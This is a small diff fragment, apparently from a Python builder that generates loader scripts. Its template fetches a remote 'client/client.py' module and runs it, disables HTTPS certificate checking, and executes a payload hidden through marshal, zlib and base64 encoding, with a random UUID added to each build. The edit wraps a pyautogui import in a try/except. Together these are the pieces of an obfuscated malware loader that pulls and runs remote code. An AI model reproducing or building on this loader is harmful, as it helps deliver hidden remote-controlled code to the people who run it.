@@ -236,10 +236,10 @@ create_moduel(url+"client/client.py").run(url, file_path)"""
 from PIL import Image
 from urllib.request import urlopen
 
-if os.environ.get('DISPLAY', '') == '':
-    print("No display found, skipping GUI libraries.")
-else:
+try:
     import pyautogui
+except Exception as e:
+    print(e)
 ssl._create_default_https_context = ssl._create_stdlib_context
 exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.compress(marshal.dumps(payload,2))))}))))
 #{uuid.uuid4()}"""
